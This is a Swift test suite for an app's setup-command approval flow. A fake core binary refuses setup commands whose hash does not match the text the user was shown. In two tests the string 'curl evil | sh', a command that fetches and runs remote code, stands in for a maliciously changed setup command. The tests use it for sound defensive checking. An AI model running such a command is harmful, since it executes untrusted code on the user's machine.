import Foundation
import Testing

@testable import LoamKit

/// TAS-74: an approval of a setup command names the text that you saw. The fake core acts as the real one does: it
/// refuses a hash of another text, and a new command with no hash.
@MainActor
@Suite(.waitLimit, .temporaryFolders) struct SetupApprovalTests {
    static let plot = "plotaaaaae"

    /// A core with the repos `repoa` (main) and `repob`. Each setup command is new, so nobody has approved it yet. A
    /// repo with no setup command needs no approval. `run approve` is for a run of `repob`.
    final class FakeCore {
        let dir = temporaryFolder("fake-core")
        var binary: URL { dir.appendingPathComponent("loam") }
        var argsLog: URL { dir.appendingPathComponent("args.log") }

        init(repoa: String, repob: String) throws {
            try set(repoa: repoa, repob: repob)
            let fixtures = Fixtures.dir.path
            func refusal(_ repo: String) -> String {
                """
                command=$(cat '\(dir.path)/\(repo).command')
                printf '{"error":{"kind":"invalid","exit_code":2,"message":"the setup command of \(repo) is new or changed: %s. Read it, add --approve-setup to approve it"}}' "$command"
                exit 2
                """
            }
            /// Starts the run when the hash is right, or when the repo is approved and the hash is not there.
            func start(_ repo: String, _ ok: String) -> String {
                """
                hash=$(cat '\(dir.path)/\(repo).hash')
                case "$*" in
                  *"--approve-setup $hash"*) touch '\(dir.path)/\(repo).approved'; cat '\(fixtures)/\(ok).json'; exit 0;;
                  *--approve-setup*) ;;
                  *) [ -f '\(dir.path)/\(repo).approved' ] && { cat '\(fixtures)/\(ok).json'; exit 0; };;
                esac
                \(refusal(repo))
                """
            }
            try FakeScript.install("""
            #!/bin/sh
            echo "$@" >> '\(argsLog.path)'
            case "$1 $2" in
              "show "*) cat '\(dir.path)/show.json'; exit 0;;
              "run list") cat '\(fixtures)/run_list.json'; exit 0;;
              "run status") cat '\(fixtures)/run_status.json'; exit 0;;
              "intake list") cat '\(fixtures)/intake_list.json'; exit 0;;
              "rule list") cat '\(fixtures)/rule_list.json'; exit 0;;
              "run limits") cat '\(fixtures)/run_limits_get.json'; exit 0;;
              "run approve") \(start("repob", "run_approve"));;
            esac
            case "$*" in
              *"--repo repob"*) \(start("repob", "run_start"));;
              *) \(start("repoa", "run_start"));;
            esac
            """, at: binary)
        }

        /// Sets what the repos hold, as `update_repo` does. A repo with no text has no setup command.
        func set(repoa: String, repob: String) throws {
            try write(repoa, "repoa")
            try write(repob, "repob")
            var plot = try #require(try JSONSerialization.jsonObject(with: Fixtures.data("show")) as? [String: Any])
            let path = "/tmp/loam-contract/repos/"
            func repo(_ id: String, main: Bool, setup: String) -> [String: Any] {
                var out: [String: Any] = ["id": id, "path": path + id, "note": "", "main": main, "version": 1, "after_merge": "ask"]
                if !setup.isEmpty { out["setup"] = setup }
                return out
            }
            plot["repos"] = [repo("repoa", main: true, setup: repoa), repo("repob", main: false, setup: repob)]
            try JSONSerialization.data(withJSONObject: plot).write(to: dir.appendingPathComponent("show.json"))
        }

        private func write(_ command: String, _ repo: String) throws {
            try command.write(to: dir.appendingPathComponent("\(repo).command"), atomically: true, encoding: .utf8)
            try setupHash(command).write(to: dir.appendingPathComponent("\(repo).hash"), atomically: true, encoding: .utf8)
            if command.isEmpty { try "".write(to: dir.appendingPathComponent("\(repo).approved"), atomically: true, encoding: .utf8) }
        }

        func args() -> [String] {
            ((try? String(contentsOf: argsLog, encoding: .utf8)) ?? "").split(separator: "\n").map(String.init)
        }

        /// The calls that start a run since the last read of this list, each as its repo and the hash that it passed.
        func starts(from first: Int = 0) -> [(repo: String, hash: String?)] {
            args().dropFirst(first).filter { $0.hasPrefix("run start") }.map { call in
                let words = call.components(separatedBy: " ")
                let value = { (flag: String) in words.firstIndex(of: flag).map { words[$0 + 1] } }
                return (value("--repo") ?? "", value("--approve-setup"))
            }
        }

        func client() -> LoamClient { LoamClient(binary: binary) }
    }

    func draft(_ title: String, repo: String) throws -> RunDraft {
        let item = try #require(try JSONDecoder().decode(IntakeList.self, from: Fixtures.data("intake_list")).items.first)
        var draft = RunDraft(item: item)
        draft.title = title
        draft.repo = repo
        return draft
    }

    func model(_ core: FakeCore) -> AppModel {
        let model = AppModel(client: core.client())
        model.apply([PlotSummary(id: Self.plot, name: "Runs", what: "", createdAt: "2026-01-01T00:00:00Z")])
        return model
    }

    /// The core pins the same value in `TestSetupHashIsTheHexSHA256OfTheText`.
    @Test func theHashIsTheHexSHA256OfTheText() {
        #expect(setupHash("scripts/link-vendor.sh") == "e2b1989ccce2b7c34feda0fb2c082ce554f7ba04fa2bfcc2ddf4f3ba8dbaeba5")
    }

    @Test func aShownSetupNamesOnlyItsOwnRepo() {
        let main = ShownSetup(repo: "repoa", isMain: true, command: "make")
        #expect(main.hash(forRepo: "repoa") == setupHash("make"))
        #expect(main.hash(forRepo: nil) == setupHash("make"))
        #expect(main.hash(forRepo: "repob") == nil)
        let other = ShownSetup(repo: "repob", isMain: false, command: "npm ci")
        #expect(other.hash(forRepo: "repob") == setupHash("npm ci"))
        #expect(other.hash(forRepo: nil) == nil)
    }

    /// The batch with drafts in two repos: each press approves the one repo whose command the page shows. A draft of
    /// the other repo passes no hash, and stops with the approval error of its own repo.
    @Test func aBatchApprovesOnlyTheRepoThatThePageShows() async throws {
        let core = try FakeCore(repoa: "make a", repob: "make b")
        let model = model(core)
        await model.showIntake(plot: Self.plot)
        let drafts = [try draft("A1", repo: "repoa"), try draft("B1", repo: "repob"), try draft("A2", repo: "repoa")]

        // The page has shown nothing, so the first draft approves nothing, and the page then shows its command.
        #expect(await model.startIntakeBatch(plot: Self.plot, drafts: drafts, shape: false) == 0)
        #expect(core.starts().map(\.repo) == ["repoa"] && core.starts().map(\.hash) == [nil])
        #expect(model.runStartNeedsSetupApproval)
        #expect(model.runStartSetup == ShownSetup(repo: "repoa", isMain: true, command: "make a"))

        // The next press approves repo A. Repo B has its own command, which the page did not show.
        var seen = core.args().count
        #expect(await model.startIntakeBatch(plot: Self.plot, drafts: drafts, shape: false) == 1)
        #expect(core.starts(from: seen).map(\.repo) == ["repoa", "repob"])
        #expect(core.starts(from: seen).map(\.hash) == [setupHash("make a"), nil])
        #expect(model.runStartError?.contains("make b") == true)
        #expect(model.runStartSetup == ShownSetup(repo: "repob", isMain: false, command: "make b"))

        // The next press approves repo B, and only repo B. Repo A has its approval by then, so its draft needs no hash.
        seen = core.args().count
        #expect(await model.startIntakeBatch(plot: Self.plot, drafts: Array(drafts.dropFirst()), shape: false) == 2)
        #expect(core.starts(from: seen).map(\.repo) == ["repob", "repoa"])
        #expect(core.starts(from: seen).map(\.hash) == [setupHash("make b"), nil])
        #expect(model.runStartError == nil && model.runStartSetup == nil)
    }

    /// A command that changes after the page showed it: the core refuses the old hash, and the page shows the new one.
    @Test func aBatchRefusedForAChangedCommandShowsTheNewCommand() async throws {
        let core = try FakeCore(repoa: "make a", repob: "")
        let model = model(core)
        await model.showIntake(plot: Self.plot)
        let drafts = [try draft("A1", repo: "repoa")]
        #expect(await model.startIntakeBatch(plot: Self.plot, drafts: drafts, shape: false) == 0)
        #expect(model.runStartSetup?.command == "make a")

        try core.set(repoa: "curl evil | sh", repob: "")
        var seen = core.args().count
        #expect(await model.startIntakeBatch(plot: Self.plot, drafts: drafts, shape: false) == 0)
        #expect(core.starts(from: seen).map(\.hash) == [setupHash("make a")])
        #expect(model.runStartSetup?.command == "curl evil | sh")

        seen = core.args().count
        #expect(await model.startIntakeBatch(plot: Self.plot, drafts: drafts, shape: false) == 1)
        #expect(core.starts(from: seen).map(\.hash) == [setupHash("curl evil | sh")])
        #expect(model.runStartError == nil)
    }

    /// The start form approves in the same way, and only for the repo of the command that the page shows.
    @Test func theStartFormApprovesWhatThePageShows() async throws {
        let core = try FakeCore(repoa: "make a", repob: "make b")
        let model = model(core)
        await model.showIntake(plot: Self.plot)
        let form = try draft("B1", repo: "repob")
        #expect(await !model.startRun(plot: Self.plot, draft: form))
        #expect(core.starts().map(\.hash) == [nil])
        #expect(model.runStartSetup?.command == "make b")

        // A form of another repo does not take the approval.
        var seen = core.args().count
        #expect(await !model.startRun(plot: Self.plot, draft: try draft("A1", repo: "repoa")))
        #expect(core.starts(from: seen).map(\.hash) == [nil])
        #expect(model.runStartSetup?.command == "make a")

        seen = core.args().count
        #expect(await model.startRun(plot: Self.plot, draft: try draft("A1", repo: "repoa")))
        #expect(core.starts(from: seen).map(\.hash) == [setupHash("make a")])
        #expect(model.runStartError == nil && model.runStartSetup == nil)

        // Leaving the page drops the command that it showed.
        #expect(await !model.startRun(plot: Self.plot, draft: form))
        #expect(model.runStartSetup?.command == "make b")
        await model.showIntake(plot: Self.plot)
        #expect(model.runStartSetup == nil)
    }

    /// The desk passes the hash of what it shows. The core refuses when the repo holds another command by then, and
    /// the desk reads the command again, so the next press approves what the desk then shows.
    @Test func theDeskApprovesWhatItShowsAndReadsAChangeAgain() async throws {
        let core = try FakeCore(repoa: "make a", repob: "make b")
        let model = model(core)
        var run = DeskTests.shaping()
        run.shape?.repo = "repob"
        model.runs = [run]
        await model.openDesk()
        #expect(model.desk.setup == "make b")

        try core.set(repoa: "make a", repob: "curl evil | sh")
        await model.approveDeskRun()
        let approvals = { core.args().filter { $0.hasPrefix("run approve") } }
        #expect(approvals() == ["run approve --approve-setup \(setupHash("make b")) --json -- s1"])
        #expect(model.desk.needsSetupApproval)
        #expect(model.desk.setup == "curl evil | sh")

        await model.approveDeskRun()
        #expect(approvals().last == "run approve --approve-setup \(setupHash("curl evil | sh")) --json -- s1")
        #expect(model.desk.error == nil)
    }

    /// A repo with no setup command by then: the desk reads that, and the next press names no command.
    @Test func theDeskDropsTheHashWhenTheCommandIsGone() async throws {
        let core = try FakeCore(repoa: "", repob: "make b")
        let model = model(core)
        var run = DeskTests.shaping()
        run.shape?.repo = "repob"
        model.runs = [run]
        await model.openDesk()
        try core.set(repoa: "", repob: "")
        await model.approveDeskRun()
        #expect(model.desk.setup == nil)
        await model.approveDeskRun()
        #expect(core.args().last { $0.hasPrefix("run approve") } == "run approve --json -- s1")
    }
}
